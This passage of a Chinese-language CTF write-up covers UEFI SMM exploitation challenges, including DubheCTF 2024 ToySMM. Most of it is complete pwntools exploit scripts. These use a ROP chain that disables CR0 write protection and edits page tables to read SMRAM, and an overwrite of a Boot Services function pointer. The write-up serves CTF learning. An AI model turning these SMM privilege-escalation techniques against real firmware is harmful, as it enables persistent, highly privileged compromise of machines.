class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy real ROP chain into buffer + 0x800 */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + real_chain]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;real_chain_size&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* These two regs will spill on SMI stack */</span></span><br><span class="line"><span class="string">    mov r14, 0x7fe5269         /* pop rsp; ret */</span></span><br><span class="line"><span class="string">    mov r15, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span>  /* -&gt; RSP */</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">real_chain:</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;real_chain&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX  - &#x27;</span>)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终效果如下：  </p>
<img src="/2024/12/14/uefi/23.png" class="" title="我的图图呢">  

<h3 id="DubheCTF-2024-ToySMM"><a href="#DubheCTF-2024-ToySMM" class="headerlink" title="DubheCTF 2024 ToySMM"></a>DubheCTF 2024 ToySMM</h3><p>恭喜你已经成功入门 UEFI，接下来就来看看 XCTF 吧🤣🤣🤣</p>
<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p>
<blockquote>
<p>UEFI SMM<br>U know?<br>:)  </p>
</blockquote>
<p>运行效果：  </p>
<img src="/2024/12/14/uefi/24.png" class="" title="我的图图呢">  

<p>题目的文件结构如下：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ToySMM/</span><br><span class="line">├── OVMF_CODE.fd</span><br><span class="line">├── OVMF_VARS.fd</span><br><span class="line">├── flagregion</span><br><span class="line">├── kvmvapic.bin</span><br><span class="line">├── qemu-system-x86_64</span><br><span class="line">├── readme.md</span><br><span class="line">├── rootfs</span><br><span class="line">│   ├── ToyApp.efi</span><br><span class="line">│   └── startup.nsh</span><br><span class="line">└── run.sh</span><br></pre></td></tr></table></figure>

<p>有一个 readme.md 文件，内容如下：  </p>
<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## Quick start</span></span><br><span class="line"></span><br><span class="line"><span class="code">`./run.sh`</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Files</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> flagregion</span><br><span class="line"></span><br><span class="line">​       Real flag (Not very real :)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> kvmvapic.bin</span><br><span class="line"></span><br><span class="line">​       Used by qemu-system-x86<span class="emphasis">_64</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ qemu-system-x86_</span>64</span><br><span class="line"></span><br><span class="line">​       Self build qemu with some patch to smm region (Hide real flag in 0x23330000)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> run.sh</span><br><span class="line"></span><br><span class="line">​       Start the virtual UEFI OVMF env.</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> OVMF<span class="emphasis">_CODE.fd OVMF_</span>VARS.fd</span><br><span class="line"></span><br><span class="line">​       UEFI emulation env build with edk2</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> rootfs</span><br><span class="line"></span><br><span class="line">​       Store a nsh file to auth start ToyApp.efi</span><br><span class="line"></span><br><span class="line"><span class="section">## Notice &amp;&amp; Tips</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Seld-build qemu-systyem-x86<span class="emphasis">_64 is built and tested on ubuntu</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ [<span class="string">UEFITools</span>](<span class="link">https://github.com/LongSoft/UEFITool</span>)  is a tool parse UEFI Firmware package</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ Only Ring -2 privileges can read the correct flag in 0x23330000</span></span><br></pre></td></tr></table></figure>

<p>也就是说我们需要利用漏洞来获取地址 0x23330000 上的 flag，感觉要求和上面两道题基本一致。<br>由于这道题没有给出 patch 文件且只给了打包好的固件，所以这个时候我们需要使用一个 ida 插件 <a target="_blank" rel="noopener" href="https://github.com/binarly-io/efiXplorer/releases">efiXplorer</a> 来帮我们解包。安装好该插件后将 OVMF_CODE.fd 拖进 ida 后会自动进行解包。通过直觉🤣🤣🤣找到了 ToySMM_handler 函数然后手动恢复了一下符号：  </p>
<img src="/2024/12/14/uefi/25.png" class="" title="我的图图呢">  

<p>该函数第一个 if 语句里面是调用一次 BOOT_SERVICES-&gt;LocateProtocol，第二个 if 语句是不可能进去的，这让我很好奇 sub_363000 这个函数是在干什么 :)  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_363000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_364052</span>(<span class="number">0x23330000</span>i64, <span class="number">32</span>i64);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_364052</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  __int64 i; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; a2 != i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v4 = __inbyte(<span class="number">0x3FD</span>u);</span><br><span class="line">    <span class="keyword">while</span> ( (v4 &amp; <span class="number">0x20</span>) == <span class="number">0</span> );</span><br><span class="line">    __outbyte(<span class="number">0x3F8</span>u, *(_BYTE *)(a1 + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个函数就类似于用于打印 flag 的后门函数，所以我们让程序执行这个函数即可。然后这里让我没想到的是，BOOT_SERVICES 这个函数虚表是可以改的，所以我们直接把 BOOT_SERVICES-&gt;LocateProtocol 改成打印后门的函数就能直接获取 flag 了，不过在这之前要满足第一个 if 的条件。不过由于 CommBuffer 和 CommBufferSize 是我们这些用户可控的，所以很容易满足。这里还有一个问题就是如何找到后门函数的地址，我的做法是直接在 gdb 中搜索 0x23330000，因为在调用后门函数前的第二个 if 语句有对这个数的使用  </p>
<img src="/2024/12/14/uefi/26.png" class="" title="我的图图呢">  

<p>然后直接和 ida 里的汇编进行比较，就能够找到后门函数的地址  </p>
<img src="/2024/12/14/uefi/27.png" class="" title="我的图图呢">  

<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices&#125;</span></span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* 